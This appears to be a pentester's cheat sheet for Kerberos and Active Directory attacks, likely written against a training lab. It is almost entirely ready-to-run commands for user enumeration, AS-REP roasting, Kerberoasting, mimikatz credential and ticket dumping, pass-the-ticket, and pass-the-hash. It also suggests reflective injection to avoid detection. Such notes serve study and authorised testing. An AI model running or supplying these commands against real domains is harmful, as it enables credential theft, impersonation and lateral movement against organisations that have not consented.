### Attack privilege requirements 

-  **Kerbrute Enumeration** - No domain access required 
-   **Pass the Ticket** - Access as a user to the domain required
-   **Kerberoasting** - Access as any user required
-   **AS-REP Roasting** - Access as any user required  
-   **Golden Ticket** - Full domain compromise (domain admin) required 
-   **Silver Ticket** - Service hash required 
-   **Skeleton Key** - Full domain compromise (domain admin) required

### Kerberos attacks

1. If pre-auth not enabled -> request the TGT -> by decrypting the session key guess the user password (hashcat) (**As-rep roasting**)
2. (Not common but, need to compromise a high priv account) if we can crack or get the krbtgt account password -> create our own ticket and pretend to be an admin (**Golden ticket** )
3.  Request the Service ticket -> try to crack the service password (**Kerberoasting**)
4. Having a service account password we can create our own ticket (**Silver ticket**)

### Non-preauth (Not common)

```
GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
```

### Abusing Pre-auth

kerberos will respond with KRB5KDC_ERR_PREAUTH_REQUIRED if the user is valid
and KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN for invalid user

```kerbrute
kerbrute userenum --dc 10.10.255.139  -d CONTROLLER.local /usr/share/wordlists/dirb/active_directory/thm_users.txt
```


```nmap
nmap 10.10.255.139 -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='CONTROLLER.local',userdb='/usr/share/wordlists/dirb/active_directory/thm_users.txt'
```

```metasploit
use auxiliary/gather/kerberos_enumusers
```


### Kerberoasting

```impacket
GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.255.139 -request
```

on local machine

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```
```mimikatz
kerberos::list /export
```

then

```hashcat
john --format=krb5tgs hash_sql --wordlist=/tmp/Pass.txt
```

#### Cached Credential Retriaval
avoid executing mimikatz as a standalone application

https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

passwords of currently logon users

```mimikatz
sekurlsa::logonpasswords
```

steal currently stored tickets

```mimikatz
sekurlsa::tickets
```

this can be used to pass the ticket


### Pass the Ticket
dump the tickets from the LSAS memory

```1
sekurlsa::tickets /export
```

```2
kerberos::ptt <ticket>
```

check

```
klist
```


#### Pass the hash

```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

